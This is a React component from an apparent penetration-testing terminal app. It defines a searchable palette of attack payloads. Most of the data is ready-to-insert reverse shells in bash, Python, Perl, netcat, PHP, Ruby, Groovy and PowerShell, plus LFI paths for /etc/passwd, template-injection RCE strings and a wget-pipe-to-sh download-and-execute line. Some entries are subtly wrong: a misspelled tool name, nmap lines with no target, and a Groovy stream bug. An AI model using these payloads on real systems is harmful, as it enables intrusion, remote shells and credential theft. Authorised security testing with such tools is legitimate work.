import { useState, useRef, useEffect, useMemo } from 'react';
import { useTerminalStore } from '../store/terminal';

export interface Payload {
  id: string;
  name: string;
  category: string;
  content: string;
  description?: string;
}

export interface Wordlist {
  id: string;
  name: string;
  path: string;
}

export const WORDLISTS: Wordlist[] = [
  { id: 'wl-rockyou', name: 'RockYou', path: '/usr/share/wordlists/rockyou.txt' },
  { id: 'wl-rockyou-gz', name: 'RockYou (.gz)', path: '/usr/share/wordlists/rockyou.txt.gz' },
  { id: 'wl-seclists-common', name: 'SecLists Web-Content (common)', path: '/usr/share/seclists/Discovery/Web-Content/common.txt' },
  { id: 'wl-seclists-medium', name: 'SecLists Web-Content (medium)', path: '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt' },
  { id: 'wl-dirbuster-medium', name: 'DirBuster (medium)', path: '/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt' },
  { id: 'wl-subdomains', name: 'SecLists Subdomains (top 5k)', path: '/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt' },
  { id: 'wl-names', name: 'SecLists Names', path: '/usr/share/seclists/Usernames/Names/names.txt' },
  { id: 'wl-passwords-top10k', name: 'Common Passwords (top 10k)', path: '/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt' },
  { id: 'wl-raft-small', name: 'Raft Small Directories', path: '/usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt' },
  { id: 'wl-raft-medium', name: 'Raft Medium Directories', path: '/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt' },
  { id: 'wl-raft-large', name: 'Raft Large Directories', path: '/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt' },
  { id: 'wl-common-php', name: 'Common PHP Files', path: '/usr/share/seclists/Discovery/Web-Content/common-php.txt' },
  { id: 'wl-wfuzz-general', name: 'WFuzz General (big)', path: '/usr/share/wfuzz/wordlist/general/common.txt' },
  { id: 'wl-api-endpoints', name: 'SecLists API Endpoints', path: '/usr/share/seclists/Discovery/Web-Content/api-endpoints.txt' },
  { id: 'wl-graphql', name: 'GraphQL Paths', path: '/usr/share/seclists/Discovery/Web-Content/graphql.txt' },
];

export const PAYLOADS: Payload[] = [
  // Reverse Shells
  { id: 'rs-bash', name: 'Bash TCP', category: 'Reverse Shells', content: 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1', description: 'Standard bash reverse shell' },
  { id: 'rs-bash2', name: 'Bash UDP', category: 'Reverse Shells', content: 'bash -i >& /dev/udp/{LHOST}/{LPORT} 0>&1', description: 'Bash reverse shell over UDP' },
  { id: 'rs-python', name: 'Python', category: 'Reverse Shells', content: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`, description: 'Python reverse shell' },
  { id: 'rs-perl', name: 'Perl', category: 'Reverse Shells', content: `perl -e 'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")}'`, description: 'Perl reverse shell' },
  { id: 'rs-nc', name: 'Netcat', category: 'Reverse Shells', content: 'nc -e /bin/sh {LHOST} {LPORT}', description: 'Netcat reverse shell' },
  { id: 'rs-ncmk', name: 'Netcat (mkfifo)', category: 'Reverse Shells', content: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f', description: 'Netcat without -e' },
  { id: 'rs-php', name: 'PHP', category: 'Reverse Shells', content: `php -r '$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");'`, description: 'PHP reverse shell' },
  { id: 'rs-ruby', name: 'Ruby', category: 'Reverse Shells', content: `ruby -rsocket -e'f=TCPSocket.open("{LHOST}",{LPORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`, description: 'Ruby reverse shell' },
  { id: 'rs-groovy', name: 'Groovy', category: 'Reverse Shells', content: `String host="{LHOST}";int port={LPORT};String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pi.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break}catch(Exception e){}};p.destroy();s.close()`, description: 'Groovy reverse shell' },
  { id: 'rs-powershell', name: 'PowerShell', category: 'Reverse Shells', content: `$c=New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$p=$([text.encoding]::ASCII).GetBytes("$r");$s.Write($p,0,$p.Length);$s.Flush()};$c.Close()`, description: 'PowerShell reverse shell' },

  // LFI/SSTI
  { id: 'lfi-etc', name: '/etc/passwd', category: 'LFI/SSTI', content: '../../../../etc/passwd', description: 'Linux password file' },
  { id: 'lfi-etc2', name: '/etc/passwd (null byte)', category: 'LFI/SSTI', content: '....//....//....//....//etc/passwd%00', description: 'Null byte bypass' },
  { id: 'lfi-proc', name: '/proc/self/environ', category: 'LFI/SSTI', content: '../../../../proc/self/environ', description: 'Environment variables via LFI' },
  { id: 'ssti-jinja', name: 'Jinja2 SSTI', category: 'LFI/SSTI', content: '{{7*7}}', description: 'Jinja2 template injection test' },
  { id: 'ssti-jinja2', name: 'Jinja2 RCE', category: 'LFI/SSTI', content: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", description: 'Jinja2 RCE via config' },
  { id: 'ssti-tplmap', name: 'Smarty SSTI', category: 'LFI/SSTI', content: '{system("id")}', description: 'Smarty template injection' },
  { id: 'ssti-freemarker', name: 'FreeMarker SSTI', category: 'LFI/SSTI', content: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', description: 'FreeMarker template injection' },

  // Encoding
  { id: 'enc-b64enc', name: 'Base64 Encode', category: 'Encoding', content: 'echo "{INPUT}" | base64', description: 'Base64 encode a string' },
  { id: 'enc-b64dec', name: 'Base64 Decode', category: 'Encoding', content: 'echo "{INPUT}" | base64 -d', description: 'Base64 decode a string' },
  { id: 'enc-url', name: 'URL Encode', category: 'Encoding', content: 'python3 -c "import urllib.parse; print(urllib.parse.quote(\'{INPUT}\'))"', description: 'URL encode' },
  { id: 'enc-urldec', name: 'URL Decode', category: 'Encoding', content: 'python3 -c "import urllib.parse; print(urllib.parse.unquote(\'{INPUT}\'))"', description: 'URL decode' },

  // Enumeration
  { id: 'enum-nmap', name: 'Nmap Full', category: 'Enumeration', content: 'nmap -sC -sV -oA {TARGET}', description: 'Default scripts + version detection' },
  { id: 'enum-nmapall', name: 'Nmap All Ports', category: 'Enumeration', content: 'nmap -p- --min-rate 10000 -oA {TARGET}-allports', description: 'Scan all ports fast' },
  { id: 'enum-gobuster', name: 'Gobuster Dir', category: 'Enumeration', content: 'gobuster dir -u http://{TARGET} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt', description: 'Directory brute force' },
  { id: 'enum-ferox', name: 'Feroxbuster', category: 'Enumeration', content: 'feroxburst -u http://{TARGET} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt -o ferox-{TARGET}.json', description: 'Recursive directory scan' },
  { id: 'enum-sub', name: 'Subfinder', category: 'Enumeration', content: 'subfinder -d {TARGET} -o subs.txt', description: 'Subdomain enumeration' },
  { id: 'enum-vhosts', name: 'Gobuster VHost', category: 'Enumeration', content: 'gobuster vhost -u http://{TARGET} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt', description: 'Virtual host enumeration' },
  { id: 'enum-nikto', name: 'Nikto', category: 'Enumeration', content: 'nikto -h http://{TARGET} -o nikto-{TARGET}.txt', description: 'Web vulnerability scanner' },

  // Privesc
  { id: 'privesc-linpeas', name: 'LinPEAS', category: 'Privilege Escalation', content: 'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh', description: 'Linux privilege escalation enumerator' },
  { id: 'privesc-linenum', name: 'LinEnum', category: 'Privilege Escalation', content: 'curl -O https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh', description: 'Linux enumeration script' },
  { id: 'privesc-suid', name: 'Find SUID', category: 'Privilege Escalation', content: 'find / -perm -u=s -type f 2>/dev/null', description: 'Find SUID binaries' },
  { id: 'privesc-sudo', name: 'Sudo -l', category: 'Privilege Escalation', content: 'sudo -l', description: 'Check sudo permissions' },

  // Misc
  { id: 'misc-pwgen', name: 'Password Generator', category: 'Misc', content: 'openssl rand -base64 32', description: 'Generate random password' },
  { id: 'misc-shellshock', name: 'Shellshock Test', category: 'Misc', content: 'env x="() { :;}; echo vulnerable" bash -c "echo test"', description: 'Shellshock vulnerability test' },
  { id: 'misc-wget', name: 'Wget Paste', category: 'Misc', content: 'wget {URL} -O - | sh', description: 'Download and execute' },
  { id: 'misc-pipe', name: 'Bash Pipe', category: 'Misc', content: 'bash -c "cat /dev/tcp/{LHOST}/{LPORT}"', description: 'Bash TCP connection' },
];

interface PayloadPaletteProps {
  onSelect: (payload: string) => void;
  onClose: () => void;
}

export function PayloadPalette({ onSelect, onClose }: PayloadPaletteProps) {
  const [query, setQuery] = useState('');
  const [selectedIndex, setSelectedIndex] = useState(0);
  const inputRef = useRef<HTMLInputElement>(null);

  const categories = useMemo(() => [...new Set(PAYLOADS.map((p) => p.category))], []);

  const filtered = useMemo(() => {
    if (!query) return PAYLOADS;
    const q = query.toLowerCase();
    return PAYLOADS.filter(
      (p) =>
        p.name.toLowerCase().includes(q) ||
        p.category.toLowerCase().includes(q) ||
        p.content.toLowerCase().includes(q)
    );
  }, [query]);

  useEffect(() => {
    inputRef.current?.focus();
  }, []);

  useEffect(() => {
    setSelectedIndex(0);
  }, [query]);

  useEffect(() => {
    const handler = (e: KeyboardEvent) => {
      if (e.key === 'ArrowDown') {
        e.preventDefault();
        setSelectedIndex((i) => Math.min(i + 1, filtered.length - 1));
      } else if (e.key === 'ArrowUp') {
        e.preventDefault();
        setSelectedIndex((i) => Math.max(i - 1, 0));
      } else if (e.key === 'Enter' && filtered[selectedIndex]) {
        onSelect(filtered[selectedIndex].content);
        onClose();
      } else if (e.key === 'Escape') {
        onClose();
      }
    };
    window.addEventListener('keydown', handler);
    return () => window.removeEventListener('keydown', handler);
  }, [filtered, selectedIndex, onSelect, onClose]);

  return (
    <div className="payload-palette-overlay" onClick={onClose}>
      <div className="payload-palette" onClick={(e) => e.stopPropagation()}>
        <div className="payload-header">
          <span className="payload-title">Payloads</span>
          <button className="payload-close" onClick={onClose}>×</button>
        </div>
        <input
          ref={inputRef}
          className="payload-search"
          placeholder="Search payloads..."
          value={query}
          onChange={(e) => setQuery(e.target.value)}
        />
        <div className="payload-list">
          {filtered.map((payload, i) => (
            <div
              key={payload.id}
              className={`payload-item ${i === selectedIndex ? 'selected' : ''}`}
              onClick={() => {
                onSelect(payload.content);
                onClose();
              }}
              onMouseEnter={() => setSelectedIndex(i)}
            >
              <div className="payload-item-header">
                <span className="payload-name">{payload.name}</span>
                <span className="payload-category">{payload.category}</span>
              </div>
              {payload.description && (
                <div className="payload-desc">{payload.description}</div>
              )}
              <code className="payload-preview">
                {payload.content.slice(0, 80)}{payload.content.length > 80 ? '...' : ''}
              </code>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
